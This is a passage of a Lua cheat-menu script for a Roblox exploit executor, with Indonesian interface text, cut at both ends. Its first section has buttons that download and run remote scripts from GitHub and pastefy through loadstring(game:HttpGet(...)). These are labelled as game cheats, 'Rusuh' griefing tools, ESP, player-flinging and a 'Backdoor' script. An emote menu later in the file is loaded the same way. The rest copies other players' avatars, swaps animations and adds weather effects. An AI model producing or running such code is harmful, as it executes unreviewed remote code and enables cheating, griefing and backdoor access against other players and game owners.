                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://pastefy.app/NSlP3WqG/raw"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="raw\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })    
--| =========================================================== |--
--| Forgee TAB SETUP                                          |--
--| =========================================================== |--    
    local ForgeeTab = ListScript:Section({
        Title = "Forge Script | Tidak Di Perjual Belikan",
        Icon = "ghost",
        Opened = false,
    }) 
    ForgeeTab:Button({
        Title = "Toasty Forge Script",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/Toasty/forge.lua"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="forge.lua\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    FishitTab:Button({
        Title = "Rock Hub Premium Forge",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/RockH/ForgeRock"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="ForgeRock\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
  FishitTab:Button({
        Title = "Free Auto Mine AKA STORE",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Avka24/marv/refs/heads/main/automineforge"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="automineforge\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
--| =========================================================== |--
--| Rusuh TAB SETUP                                          |--
--| =========================================================== |--    
    local RusuhhTab = ListScript:Section({
        Title = "Script Rusuh | Tidak Di Perjual Belikan",
        Icon = "gamepad-2",
        Opened = false,
    })
    RusuhhTab:Button({
        Title = "[Spectator] POKAY - Rusuh ",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/PunyaBrian/simpan/refs/heads/main/data/katanya/katanya"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="katanya\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    RusuhhTab:Button({
        Title = "W - ESP",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/WarpahSkillissue/WESP"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="WESP\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    RusuhhTab:Button({
        Title = "W - Backdoor",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/WarpahSkillissue/Backdoor"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="Backdoor\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    RusuhhTab:Button({
        Title = "W - Bring Part",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/WarpahSkillissue/BRING"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="BRING\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    RusuhhTab:Button({
        Title = "W - Part Controll V1",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/WarpahSkillissue/PartControll1"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="PartControll1\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    RusuhhTab:Button({
        Title = "W - Part Controll V2",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/WarpahSkillissue/PartControll2"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="PartControll2\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    RusuhhTab:Button({
        Title = "W - Part Controll V3",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/WarpahSkillissue/PartControll3"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="PartControll3\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    RusuhhTab:Button({
        Title = "W - Multi Fling",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/WarpahSkillissue/MultiFling"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="MultiFling\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    RusuhhTab:Button({
        Title = "W - Walk Fling",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/WarpahSkillissue/WalkFling"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="WalkFling\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
end

--| =========================================================== |--
--| COPY AVATAR TAB                                             |--
--| =========================================================== |--

local function setupCopyavatarTab()
    if not CopyavatarTab then return end
    if getgenv()["_SETUP_DONE_setupCopyavatarTab"] then return end
    getgenv()["_SETUP_DONE_setupCopyavatarTab"] = true

    ----------------------------------------------------------------
    -- SERVICES
    ----------------------------------------------------------------
    local PlayersService = game:GetService("Players")
    local LocalPlayer = PlayersService.LocalPlayer

    ----------------------------------------------------------------
    -- 📌 Helper: Ambil Headshot Profil
    ----------------------------------------------------------------
    local function getHeadshotUrl(userId)
        local ok, url = pcall(function()
            return PlayersService:GetUserThumbnailAsync(
                userId,
                Enum.ThumbnailType.HeadShot,
                Enum.ThumbnailSize.Size150x150
            )
        end)
        if ok and url then
            return url
        else
            return "https://www.roblox.com/headshot-thumbnail/image?userId=" ..
                tostring(userId) .. "&width=150&height=150&format=png"
        end
    end

    ----------------------------------------------------------------
    -- 📌 Helper: Copy Avatar dari Player
    ----------------------------------------------------------------
    local function copyAvatarFromPlayer(targetPlr)
        if not targetPlr or not targetPlr.UserId then
            WindUI:Notify({ Title = "Error", Content = "Tidak ada player yang dipilih!", Duration = 3, Icon = "x" })
            return
        end

        local username = targetPlr.Name
        local userId = targetPlr.UserId

        if not LocalPlayer.Character then
            WindUI:Notify({ Title = "Error", Content = "Karakter kamu belum dimuat.", Duration = 3, Icon = "x" })
            return
        end

        task.spawn(function()
            -- Ambil humanoid description target
            local okDesc, humanoidDesc = pcall(function()
                return PlayersService:GetHumanoidDescriptionFromUserId(userId)
            end)

            if not okDesc or not humanoidDesc then
                WindUI:Notify({ Title = "Error", Content = "Gagal mengambil avatar player.", Duration = 3, Icon = "x" })
                return
            end

            local char = LocalPlayer.Character
            if not char then return end

            local humanoid = char:FindFirstChildOfClass("Humanoid")
            if not humanoid then
                WindUI:Notify({ Title = "Error", Content = "Humanoid tidak ditemukan.", Duration = 3, Icon = "x" })
                return
            end

            -- Destroy pakaian lama (non-freeze)
            for _, item in ipairs(char:GetChildren()) do
                if item:IsA("Accessory") or item:IsA("Hat") or item:IsA("Shirt") or item:IsA("Pants") or item:IsA("ShirtGraphic") then
                    task.defer(item.Destroy, item)
                end
            end

            task.wait(0.2)

            -- Apply
            local applied = false
            local okApply = pcall(function()
                if humanoid.ApplyDescriptionClientServer then
                    humanoid:ApplyDescriptionClientServer(humanoidDesc)
                else
                    humanoid:ApplyDescription(humanoidDesc)
                end
            end)

            if okApply then
                applied = true
            else
                -- Fallback: spawn ulang character
                okApply = pcall(function()
                    LocalPlayer:LoadCharacter()
                    task.wait(1)
                    local newHumanoid = LocalPlayer.Character:WaitForChild("Humanoid")
                    newHumanoid:ApplyDescription(humanoidDesc)
                end)
                applied = okApply
            end

            if applied then
                WindUI:Notify({
                    Title = "Success",
                    Content = "Avatar berhasil disalin dari " .. username .. "!",
                    Duration = 3,
                    Icon = "check"
                })
            else
                WindUI:Notify({
                    Title = "Error",
                    Content = "Gagal menerapkan avatar (server membatasi perubahan avatar).",
                    Duration = 3,
                    Icon = "x"
                })
            end
        end)
    end

    ----------------------------------------------------------------
    -- 📌 RESET Avatar ke Original
    ----------------------------------------------------------------
    local function resetAvatarToOriginal()
        task.spawn(function()
            local okDesc, humanoidDesc = pcall(function()
                return PlayersService:GetHumanoidDescriptionFromUserId(LocalPlayer.UserId)
            end)

            if not okDesc then
                -- fallback respawn
                local ok = pcall(function()
                    LocalPlayer:LoadCharacter()
                end)

                if ok then
                    WindUI:Notify({ Title = "Reset", Content = "Avatar dikembalikan dengan respawn.", Duration = 3, Icon = "refresh-ccw" })
                else
                    WindUI:Notify({ Title = "Error", Content = "Gagal reset avatar!", Duration = 3, Icon = "x" })
                end
                return
            end

            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            local humanoid = char:FindFirstChildOfClass("Humanoid")
            if not humanoid then return end

            for _, item in ipairs(char:GetChildren()) do
                if item:IsA("Accessory") or item:IsA("Hat") or item:IsA("Shirt") or item:IsA("Pants") or item:IsA("ShirtGraphic") then
                    task.defer(item.Destroy, item)
                end
            end

            task.wait(0.15)

            local okApply = pcall(function()
                if humanoid.ApplyDescriptionClientServer then
                    humanoid:ApplyDescriptionClientServer(humanoidDesc)
                else
                    humanoid:ApplyDescription(humanoidDesc)
                end
            end)

            if okApply then
                WindUI:Notify({ Title = "Reset", Content = "Avatar original dipulihkan!", Duration = 3, Icon = "check" })
            else
                pcall(function() LocalPlayer:LoadCharacter() end)
                WindUI:Notify({ Title = "Reset", Content = "Avatar dipulihkan melalui respawn.", Duration = 3, Icon = "refresh-ccw" })
            end
        end)
    end

    ----------------------------------------------------------------
    -- 📌 UI COPY AVATAR
    ----------------------------------------------------------------

    local playerInfoSection = CopyavatarTab:Section({
        Title = "POKAY Script | Copy Avatar",
        TextXAlignment = "Left",
        TextSize = 17,
		Opened = true,
    })

    local playerInfoContainer = playerInfoSection:Paragraph({
        Title = "Tidak ada player yang dipilih",
        Desc = "Informasi player akan muncul di sini",
        Buttons = {}
    })

    local targetPlayer = nil

    -- Update UI player info
    local function updateTargetInfo(plr)
        if playerInfoContainer then
            playerInfoContainer:Destroy()
        end

        if not plr then
            playerInfoContainer = playerInfoSection:Paragraph({
                Title = "No player selected",
                Desc = "Pilih player dari dropdown",
                Buttons = {
                    {
                        Icon = "rotate-ccw",
                        Title = "Reset Avatar",
                        Callback = function()
                            resetAvatarToOriginal()
                        end
                    }
                }
            })
            return
        end

        targetPlayer = plr
        local username = plr.Name
        local displayName = plr.DisplayName
        local userId = plr.UserId
        local headshotUrl = getHeadshotUrl(userId)

        playerInfoContainer = playerInfoSection:Paragraph({
            Title = "User: " .. username .. "\nNick: " .. displayName .. " \nID: " .. tostring(userId),
            Desc = "Player targeted",
            Image = headshotUrl,
            ImageSize = 80,
            Buttons = {
                {
                    Icon = "user",
                    Title = "Copy Avatar",
                    Callback = function()
                        copyAvatarFromPlayer(plr)
                    end
                },
                {
                    Icon = "rotate-ccw",
                    Title = "Reset Avatar",
                    Callback = function()
                        resetAvatarToOriginal()
                    end
                }
            }
        })
    end

    ----------------------------------------------------------------
    -- Dropdown list player
    ----------------------------------------------------------------
    local function getListPlayer()
        local names = {"None"}
        for _, plr in ipairs(PlayersService:GetPlayers()) do
            if plr ~= LocalPlayer then
                table.insert(names, plr.Name)
            end
        end
        return names
    end

    local ignoreAutoUpdate = true

	CopyavatarTab:Divider()

    local playerDropdown = CopyavatarTab:Dropdown({
        Title = "[◉] SELECT PLAYER",
        Values = getListPlayer(),
        Value = "None",
        SearchBarEnabled = true,
        Callback = function(selectedName)
            if selectedName == "None" then
                updateTargetInfo(nil)
            else
                local plr = PlayersService:FindFirstChild(selectedName)
                updateTargetInfo(plr)
            end
        end
    })

    CopyavatarTab:Button({
        Title = "[◉] REFRESH PLAYER LIST",
        Icon = "refresh-cw",
        Callback = function()
            playerDropdown:Refresh(getListPlayer())
            WindUI:Notify({ Title = "Refreshed", Content = "Daftar player diperbarui!", Duration = 2, Icon = "check" })
        end
    })

	CopyavatarTab:Divider()

    -- Player Added / Removing
    PlayersService.PlayerAdded:Connect(function()
        task.delay(2, function()
            if not ignoreAutoUpdate then
                playerDropdown:Refresh(getListPlayer())
            end
        end)
    end)

    PlayersService.PlayerRemoving:Connect(function(plr)
        task.delay(1, function()
            if not ignoreAutoUpdate then
                playerDropdown:Refresh(getListPlayer())
            end
            if targetPlayer == plr then
                updateTargetInfo(nil)
                playerDropdown:Select("None")
            end
        end)
    end)

end

--| =========================================================== |--
--| CUSTOM ANIMATION                                            |--
--| =========================================================== |--

local function setupCustomanimationTab()
    if not CustomanimationTab then return end
    if getgenv()["_SETUP_DONE_setupCustomanimationTab"] then return end
    getgenv()["_SETUP_DONE_setupCustomanimationTab"] = true

    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    --------------------------------------
    -- STORAGE ORIGINAL ANIMATIONS
    --------------------------------------
    local OriginalAnimations = {
        Idle = {},
        Walk = "",
        Run = "",
        Jump = "",
    }

    _G.LastSelectedAnim = {
        Idle = "Original",
        Walk = "Original",
        Run = "Original",
        Jump = "Original",
    }

    -- Storage untuk input custom
    local CustomInputs = {
        Idle = "",
        Walk = "",
        Run = "",
        Jump = ""
    }

    local canAutoJump = false -- Flag untuk kontrol auto jump

    --------------------------------------
    -- FORCE REFRESH ANIM (Simple)
    --------------------------------------
    local function ForceRefresh()
        if not canAutoJump then return end
        
        local char = LocalPlayer.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end

    --------------------------------------
    -- SAVE ORIGINAL ANIMATION
    --------------------------------------
    local function SaveOriginalAnimations()
        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local animate = char:WaitForChild("Animate")

        -- IDLE
        if animate:FindFirstChild("idle") then
            OriginalAnimations.Idle = {}
            for _, a in ipairs(animate.idle:GetChildren()) do
                if a:IsA("Animation") then
                    table.insert(OriginalAnimations.Idle, a.AnimationId)
                end
            end
        end

        OriginalAnimations.Walk = animate.walk.WalkAnim.AnimationId
        OriginalAnimations.Run = animate.run.RunAnim.AnimationId
        OriginalAnimations.Jump = animate.jump.JumpAnim.AnimationId
    end

    -- Save original saat pertama kali load
    SaveOriginalAnimations()
    
    -- Aktifkan auto jump setelah 0.5 detik
    task.delay(0.5, function()
        canAutoJump = true
    end)

    --------------------------------------
    -- APPLY ORIGINAL
    --------------------------------------
    local function ApplyOriginal(typeName)
        local char = LocalPlayer.Character
        if not char then return end
        local animate = char:FindFirstChild("Animate")
        if not animate then return end

        if typeName == "Idle" then
            local idle = animate:FindFirstChild("idle")
            if idle then
                for i, anim in ipairs(idle:GetChildren()) do
                    if anim:IsA("Animation") and OriginalAnimations.Idle[i] then
                        anim.AnimationId = OriginalAnimations.Idle[i]
                    end
                end
            end
        elseif typeName == "Walk" then
            animate.walk.WalkAnim.AnimationId = OriginalAnimations.Walk
        elseif typeName == "Run" then
            animate.run.RunAnim.AnimationId = OriginalAnimations.Run
        elseif typeName == "Jump" then
            animate.jump.JumpAnim.AnimationId = OriginalAnimations.Jump
        end

        _G.LastSelectedAnim[typeName] = "Original"
        ForceRefresh()
    end

    --------------------------------------
    -- APPLY CUSTOM ANIMATION
    --------------------------------------
    local function ApplyCustom(typeName, animData)
        local char = LocalPlayer.Character
        if not char then return end
        local animate = char:FindFirstChild("Animate")
        if not animate then return end

        if typeName == "Idle" then
            local idle = animate:FindFirstChild("idle")
            if idle then
                for i, anim in ipairs(idle:GetChildren()) do
                    if anim:IsA("Animation") and animData[i] then
                        anim.AnimationId = "rbxassetid://" .. animData[i]
                    end
                end
            end
        elseif typeName == "Walk" then
            animate.walk.WalkAnim.AnimationId = "rbxassetid://" .. animData
        elseif typeName == "Run" then
            animate.run.RunAnim.AnimationId = "rbxassetid://" .. animData
        elseif typeName == "Jump" then
            animate.jump.JumpAnim.AnimationId = "rbxassetid://" .. animData
        end

        _G.LastSelectedAnim[typeName] = animData
        ForceRefresh()
    end

    --------------------------------------
    -- PARSE INPUT ID
    --------------------------------------
    local function ParseAnimationId(input, isIdle)
        if not input or input == "" then return nil end
        
        input = input:gsub("rbxassetid://", ""):gsub("%s+", "")
        
        if isIdle then
            local ids = {}
            for id in input:gmatch("([^,]+)") do
                id = id:gsub("%s+", "")
                if id:match("^%d+$") then
                    table.insert(ids, id)
                end
            end
            
            if #ids == 1 then
                return {ids[1], ids[1]}
            elseif #ids >= 2 then
                return {ids[1], ids[2]}
            end
            return nil
        else
            if input:match("^%d+$") then
                return input
            end
        end
        
        return nil
    end

    --------------------------------------
    -- AUTO APPLY AFTER RESPAWN
    --------------------------------------
    LocalPlayer.CharacterAdded:Connect(function()
        canAutoJump = false -- Disable auto jump saat respawn
        
        SaveOriginalAnimations()
        
        -- Re-apply animations yang tersimpan tanpa jump
        for typeName, lastValue in pairs(_G.LastSelectedAnim) do
            if lastValue ~= "Original" then
                task.spawn(function()
                    task.wait(0.2)
                    ApplyCustom(typeName, lastValue)
                end)
            end
        end
        
        -- Aktifkan kembali auto jump setelah respawn selesai
        task.delay(0.5, function()
            canAutoJump = true
        end)
    end)

    --------------------------------------
    -- ANIMATION PRESETS
    --------------------------------------
    local IdleAnimations = {
        ["Original"] = "Original",
        ["Adidas Community"] = { "122257458498464", "102357151005774" },
        ["Vampire"] = { "1083445855", "1083450166"},
        ["Wicked (Popular)"]  = { "118832222982049", "76049494037641"  },
        ["NFL"] = { "92080889861410", "74451233229259"},
        ["Astronaut"] = { "891621366", "891633237" },
        ["Bubbly"] = { "910004836", "910009958" },
        ["Cartoony"] = { "742637544", "742638445" },
        ["Elder"] = { "845397899", "845400520" },
        ["Knight"] = { "657595757", "657568135" },
        ["Levitation"] = { "616006778", "616008087" },
        ["Mage"] = { "707742142", "707855907" },
        ["Ninja"] = { "656117400", "656118341" },
        ["Pirate"] = { "750781874", "750782770" },
        ["Robot"] = { "616088211", "616089559" },
        ["Rthro"] = { "2510197257", "2510196951" },
        ["Stylish"] = { "616136790", "616138447" },
        ["Superhero"] = { "616111295", "616113536" },
        ["Toy"] = { "782841498", "782845736" },
        ["Werewolf"] = { "1083195517", "1083214717" },
        ["Zombie"] = { "616158929", "616160636" },
    }

    local WalkAnimations = {
        ["Original"] = "Original",
        ["Adidas Community"] = "122150855457006",
        ["Sports (Adidas)"] = "18537392113",
        ["Wicked (Popular)"] = "92072849924640",
        ["Astronaut"] = "891636393",
        ["Bubbly"] = "910034870",
        ["Cartoony"] = "742640026",
        ["Elder"] = "845403856",
        ["Knight"] = "657552124",
        ["Levitation"] = "616013216",
        ["Mage"] = "707897309",
        ["Ninja"] = "656121766",
        ["Pirate"] = "750785693",
        ["Robot"] = "616095330",
        ["Rthro"] = "2510202577",
        ["Stylish"] = "616146177",
        ["Superhero"] = "616122287",
        ["Toy"] = "782843345",
        ["Vampire"] = "1083473930",
        ["Werewolf"] = "1083178339",
        ["Zombie"] = "616168032",
    }

    local RunAnimations = {
        ["Original"] = "Original",
        ["Adidas Community"] = "82598234841035",
        ["Sports (Adidas)"] = "18537384940",
        ["Wicked (Popular)"] = "72301599441680",
        ["Astronaut"] = "891636393",
        ["Bubbly"] = "910025107",
        ["Cartoony"] = "742638842",
        ["Elder"] = "845386501",
        ["Knight"] = "657564596",
        ["Levitation"] = "616010382",
        ["Mage"] = "707861613",
        ["Ninja"] = "656118852",
        ["Pirate"] = "750783738",
        ["Robot"] = "616091570",
        ["Rthro"] = "2510198475",
        ["Stylish"] = "616140816",
        ["Superhero"] = "616117076",
        ["Toy"] = "782842708",
        ["Vampire"] = "1083462077",
        ["Werewolf"] = "1083216690",
        ["Zombie"] = "616163682",
    }

    local JumpAnimations = {
        ["Original"] = "Original",
        ["Adidas Community"] = "75290611992385",
        ["Sports (Adidas)"] = "18537380791",
        ["Wicked (Popular)"] = "104325245285198",
        ["Astronaut"] = "891627522",
        ["Bubbly"] = "910016857",
        ["Cartoony"] = "742637942",
        ["Elder"] = "845398858",
        ["Knight"] = "658409194",
        ["Levitation"] = "616008936",
        ["Mage"] = "707853694",
        ["Ninja"] = "656117878",
        ["Pirate"] = "750782230",
        ["Robot"] = "616090535",
        ["Rthro"] = "2510197830",
        ["Stylish"] = "616139451",
        ["Superhero"] = "616115533",
        ["Toy"] = "782847020",
        ["Vampire"] = "1083455352",
        ["Werewolf"] = "1083218792",
        ["Zombie"] = "616161997",
    }

    --------------------------------------
    -- CONVERT DICT → ARRAY
    --------------------------------------
    local function MakeValuesList(animTable)
        local list = {"Original"}
        for name,_ in pairs(animTable) do
            if name ~= "Original" then
                table.insert(list, name)
            end
        end
        table.sort(list)
        return list
    end

    --------------------------------------
    -- CREATE DROPDOWNS
    --------------------------------------
    local function MakeDropdown(title, animTable, typeName)
        CustomanimationTab:Dropdown({
            Title = "[◉] " .. title,
            Values = MakeValuesList(animTable),
            Value = "Original",
            SearchBarEnabled = true,
            Callback = function(value)
                if value == "Original" then
                    ApplyOriginal(typeName)
                else
                    ApplyCustom(typeName, animTable[value])
                end
            end
        })
    end

    --------------------------------------
    -- BUILD UI
    --------------------------------------


	local Paragraph = CustomanimationTab:Paragraph({
		Title = "Emot Menu",
		Desc = "Pada emot menu ini fitur tambahan yang dimana kalian bisa menggunakan emot secara free, script emot ini dibuat oleh: Vexro Emots",
	})

	CustomanimationTab:Toggle({
    	Title = "[◉]  OPEN EMOT MENU",
		Icon = "smile",
		Type = "Checkbox",
		Value = false,
    	Callback = function(state)
        	if state then
					WindUI:Notify({
    				Title = "Emot Menu",
    				Content = "Tunggu sebentar...",
    				Duration = 5,
    				Icon = "smile",
				})
				do
				    local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/zyrovell/Vexro-Emotes/main/vexroemotes.lua"))() end)
				    if not _ok then
				        WindUI:Notify({Title="❌ Script Error", Content="vexroemotes.lua\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
				    end
				end
				else
					-- Nothing
			end
    	end
	})

	CustomanimationTab:Divider()


    local Paragraph = CustomanimationTab:Paragraph({
        Title = "Animation Preset",
        Desc = "Pada animation preset ini anda tidak perlu mencari id animation, tinggal anda sesuaikan saja.",
    })

    MakeDropdown("Idle Animation", IdleAnimations, "Idle")
    MakeDropdown("Walk Animation", WalkAnimations, "Walk")
    MakeDropdown("Run Animation", RunAnimations, "Run")
    MakeDropdown("Jump Animation", JumpAnimations, "Jump")

    CustomanimationTab:Divider()

    local Paragraph = CustomanimationTab:Paragraph({
        Title = "Custom Animation",
        Desc = "Buat yang anda bingung nyari id animation nya, anda bisa salin link website di bawah ini dan paste di browser kalian.",
    })
    
    CustomanimationTab:Button({
        Title = "[◉] COPY LINK WEBSITE",
        Icon = "clipboard",
        Callback = function()
            local link = "https://id.pinterest.com/ideas/roblox-animation-id-codes/927157409080/"
            if setclipboard then
                setclipboard(link)
            elseif toclipboard then
                toclipboard(link)
            end
            WindUI:Notify({
                Title = "ID Animation",
                Content = "Url id animation berhasil di salin!",
                Duration = 3,
                Icon = "clipboard",
            })
        end
    })

    CustomanimationTab:Divider()

    CustomanimationTab:Input({
        Title = "[◉] Idle Animation",
        Type = "Input",
        InputIcon = "person-standing",
        Placeholder = "Masukan ID",
        Callback = function(input) 
            local ids = ParseAnimationId(input, true)
            if ids then
                CustomInputs.Idle = ids
                WindUI:Notify({
                    Title = "Idle",
                    Content = "ID tersimpan!",
                    Duration = 2,
                    Icon = "check",
                })
            else
                CustomInputs.Idle = ""
            end
        end
    })

    CustomanimationTab:Input({
        Title = "[◉] Walk Animation",
        Type = "Input",
        InputIcon = "person-standing",
        Placeholder = "Masukan ID",
        Callback = function(input) 
            local id = ParseAnimationId(input, false)
            CustomInputs.Walk = id or ""
        end
    })

    CustomanimationTab:Input({
        Title = "[◉] Run Animation",
        Type = "Input",
        InputIcon = "person-standing",
        Placeholder = "Masukan ID",
        Callback = function(input) 
            local id = ParseAnimationId(input, false)
            CustomInputs.Run = id or ""
        end
    })

    CustomanimationTab:Input({
        Title = "[◉] Jump Animation",
        Type = "Input",
        InputIcon = "person-standing",
        Placeholder = "Masukan ID",
        Callback = function(input) 
            local id = ParseAnimationId(input, false)
            CustomInputs.Jump = id or ""
        end
    })

    CustomanimationTab:Divider()

    local Toggle = CustomanimationTab:Toggle({
        Title = "[◉] APPLY ANIMATION",
        Callback = function(state)
            if state then
                local applied = false
                
                if CustomInputs.Idle ~= "" then
                    ApplyCustom("Idle", CustomInputs.Idle)
                    applied = true
                end
                if CustomInputs.Walk ~= "" then
                    ApplyCustom("Walk", CustomInputs.Walk)
                    applied = true
                end
                if CustomInputs.Run ~= "" then
                    ApplyCustom("Run", CustomInputs.Run)
                    applied = true
                end
                if CustomInputs.Jump ~= "" then
                    ApplyCustom("Jump", CustomInputs.Jump)
                    applied = true
                end
                
                WindUI:Notify({
                    Title = "Animation",
                    Content = applied and "Animation berhasil di ubah!" or "Tidak ada animation!",
                    Duration = 3,
                    Icon = applied and "person-standing" or "triangle-alert",
                })
            else
                ApplyOriginal("Idle")
                ApplyOriginal("Walk")
                ApplyOriginal("Run")
                ApplyOriginal("Jump")
                
                WindUI:Notify({
                    Title = "Animation",
                    Content = "Animation dikembalikan ke original!",
                    Duration = 3,
                    Icon = "person-standing",
                })
            end
        end
    })
end

--| =========================================================== |--
--| SKYBOX                                                      |--
--| =========================================================== |--

local function setupSkyboxTab()
	if not SkyboxTab then return end
    if getgenv()["_SETUP_DONE_setupSkyboxTab"] then return end
    getgenv()["_SETUP_DONE_setupSkyboxTab"] = true

	local Lighting = game:GetService("Lighting")
	local TweenService = game:GetService("TweenService")
	local player = LocalPlayer

	-------------------------------------
	-- WEATHER & LIGHTING FUNCTIONS
	-------------------------------------

	local function clearWeatherEffects()
		-- Hapus efek hujan
		local rain = workspace:FindFirstChild("RainFX")
		if rain then 
			rain:Destroy() 
		end
		
		-- Hapus efek salju
		local snow = workspace:FindFirstChild("SnowFX")
		if snow then 
			snow:Destroy() 
		end
		
		-- Hapus semua ParticleEmitter yang mungkin tertinggal
		for _, obj in pairs(workspace:GetDescendants()) do
			if obj:IsA("ParticleEmitter") and (obj.Parent.Name == "RainFX" or obj.Parent.Name == "SnowFX") then
				obj:Destroy()
			end
		end
		
		-- Hapus sound effect
		for _, sound in pairs(workspace:GetDescendants()) do
			if sound:IsA("Sound") and sound.Parent and (sound.Parent.Name == "RainFX" or sound.Parent.Name == "SnowFX") then
				sound:Stop()
				sound:Destroy()
			end
		end
	end

	local function createRainEffect()
		clearWeatherEffects()
		local folder = Instance.new("Folder", workspace)
		folder.Name = "RainFX"

		for i = 1, 12 do
			local part = Instance.new("Part")
			part.Anchored = true
			part.Transparency = 1
			part.CanCollide = false
			part.Parent = folder

			local p = Instance.new("ParticleEmitter", part)
			p.Texture = "rbxasset://textures/particles/smoke_main.dds"
			p.Rate = 300
			p.Lifetime = NumberRange.new(3, 4)
			p.Speed = NumberRange.new(80, 100)
			p.Color = ColorSequence.new(Color3.new(0.7, 0.8, 1))
			p.LightEmission = 0.2
			p.Acceleration = Vector3.new(0, -100, 0)
			p.Transparency = NumberSequence.new(0.3, 0.8)

			task.spawn(function()
				while part and part.Parent do
					if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
						part.Position = player.Character.HumanoidRootPart.Position + Vector3.new(math.random(-60, 60), 80, math.random(-60, 60))
					end
					task.wait(0.5)
				end
			end)
		end

		local s = Instance.new("Sound", folder)
		s.SoundId = "rbxassetid://3634328841"
		s.Looped = true
		s.Volume = 0.3
		s:Play()
	end

	local function createSnowEffect()
		clearWeatherEffects()
		local folder = Instance.new("Folder", workspace)
		folder.Name = "SnowFX"

		local char = player.Character or player.CharacterAdded:Wait()
		local root = char:WaitForChild("HumanoidRootPart")

		for i = 1, 12 do
			local part = Instance.new("Part")
			part.Anchored = true
			part.Transparency = 1
			part.CanCollide = false
			part.Parent = folder

			local p = Instance.new("ParticleEmitter", part)
			p.Texture = "rbxasset://textures/particles/sparkles_main.dds"
			p.Rate = 200
			p.Lifetime = NumberRange.new(8, 12)
			p.Speed = NumberRange.new(5, 10)
			p.EmissionDirection = Enum.NormalId.Bottom
			p.SpreadAngle = Vector2.new(10, 10)
			p.Color = ColorSequence.new(Color3.fromRGB(230, 240, 255))
			p.Transparency = NumberSequence.new({
				NumberSequenceKeypoint.new(0, 0.05),
				NumberSequenceKeypoint.new(1, 0.8)
			})
			p.Size = NumberSequence.new(0.3)
			p.LightEmission = 1

			task.spawn(function()
				while part and part.Parent do
					if root and root.Parent then
						part.Position = root.Position + Vector3.new(math.random(-60, 60), 80, math.random(-60, 60))
					end
					task.wait(0.5)
				end
			end)
		end
	end

	local function applyRTX()
		Lighting.Technology = Enum.Technology.ShadowMap
		Lighting.GlobalShadows = true

